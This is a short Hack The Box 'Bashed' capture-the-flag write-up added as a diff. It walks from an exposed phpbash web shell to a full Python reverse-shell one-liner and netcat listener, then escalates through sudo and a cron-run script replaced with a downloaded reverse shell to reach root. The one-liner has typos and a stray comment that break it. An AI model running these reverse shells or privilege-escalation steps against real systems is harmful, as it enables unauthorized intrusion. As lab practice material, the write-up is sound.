@@ -1,0 +1,59 @@
+HTB-Bashed-Writeup
+
+ip : 10.10.10.68
+
+Nmap
+----
+- two ports are open 80 and 3283
+
+Enumeration
+-----------
+- port 80 is running apache, lets check it out 
+- visiting the site we get a site on phpbash
+- lets enumerate further by directory bruteforcing the site 
+- we found a bunch of directories and out of which /dev is interesting 
+- visiting /dev we can see phpbash.php script which is used to run a web shell
+- we click on the script and we get a web shell as www-data 
+
+Shell as www-data
+-----------------
+- we run a python based reverse shell on the web shell we obtained 
+
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.74",9001)); //Change IP and Port
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+- catch the reverse shell with netcat
+
+	nc -nlvp 9001
+
+- we get a shell as www-data 
+- visit the /home/arrexel for the user flag
+
+Priv-esc
+--------
+- tried sudo -l and found that we can run any command as the user acriptmanager
+- lets try to access the scriptmanager shell from www-data using the command 
+	
+	sudo -u scriptmanager /bin/bash 
+
+- we get a stable shell using python
+
+	python -c 'ïmport pty; pty.spawn("/bin/bash")'
+
+- we browsed around the scriptmanagers home directory and found a suspicious directory called as scripts
+- on checking it out we see 2 files 
+- a python script test.py which writes output on the file test.txt
+- the above process is carrying out often as a cronjob or something else 
+- lets replace the test.py script with a python reverse shell
+- host the reverse shell with a python server 
+	
+	python -m SimpleHTTPServer 1234
+
+- use wget to get the file to a writable location
+- now remove the test.py and replace it with the reverseshell
+- setup a listener using netcat
+
+	nc -nlvp 9001
+
+- we get a shell as root 
+- get the flag
